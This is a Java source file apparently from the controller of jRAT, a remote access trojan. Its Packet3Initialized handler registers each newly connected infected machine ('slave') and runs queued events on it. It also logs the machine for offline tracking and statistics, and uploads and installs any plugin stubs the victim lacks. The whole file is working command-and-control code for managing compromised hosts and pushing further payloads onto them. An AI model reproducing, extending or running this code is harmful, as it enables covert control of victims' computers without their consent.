package se.jrat.client.packets.incoming;

import java.io.DataInputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import se.jrat.client.Globals;
import se.jrat.client.Main;
import se.jrat.client.OfflineSlave;
import se.jrat.client.Slave;
import se.jrat.client.addons.Plugin;
import se.jrat.client.addons.PluginLoader;
import se.jrat.client.events.Event;
import se.jrat.client.events.Events;
import se.jrat.client.net.ConnectionHandler;
import se.jrat.client.packets.outgoing.Packet101UploadPlugin;
import se.jrat.client.packets.outgoing.Packet42ServerUploadFile;
import se.jrat.client.settings.Settings;
import se.jrat.client.settings.StatisticsOperatingSystem;
import se.jrat.client.settings.StoreOfflineSlaves;
import se.jrat.client.threads.UploadThread;

public class Packet3Initialized extends AbstractIncomingPacket {

	@Override
	public void read(final Slave slave, DataInputStream dis) throws Exception {
		ConnectionHandler.addSlave(slave);

		for (Event event : Events.queue.values()) {
			event.perform(slave);
		}
		
		StoreOfflineSlaves.getGlobal().add(new OfflineSlave(slave));
		StatisticsOperatingSystem.getGlobal().add(slave);

		List<String> plugins = new ArrayList<String>(Arrays.asList(slave.getPlugins()));
		List<String> notInstalled = new ArrayList<String>();

		if (plugins != null && Settings.getGlobal().getBoolean("plugintransfer")) {
			for (Plugin plugin : PluginLoader.plugins) {
				if (!plugins.contains(plugin.getName())) {
					notInstalled.add(plugin.getName());
					Main.debug("Plugin " + plugin.getName() + " is not installed, adding to list");
				}
			}

			Map<String, File> filesToTransfer = new HashMap<String, File>();

			for (String sp : notInstalled) {
				Plugin plugin = PluginLoader.getPlugin(sp);
				File[] files = Globals.getPluginStubDirectory().listFiles();

				for (File stubFile : files) {
					if (stubFile.getName().startsWith(plugin.getName())) {
						Main.debug("Found stub plugin " + stubFile.getName() + " for plugin " + plugin.getName());
						filesToTransfer.put(plugin.getName(), stubFile);
						continue;
					}
				}
			}

			for (final String key : filesToTransfer.keySet()) {
				File file = filesToTransfer.get(key);

				Main.debug("Transferring " + key);

				slave.addToSendQueue(new Packet42ServerUploadFile(file, key, true, new UploadThread(null, key, file) {
					@Override
					public void onComplete() {
						slave.addToSendQueue(new Packet101UploadPlugin(key));
					}
				}));
			}
		}
	}

}
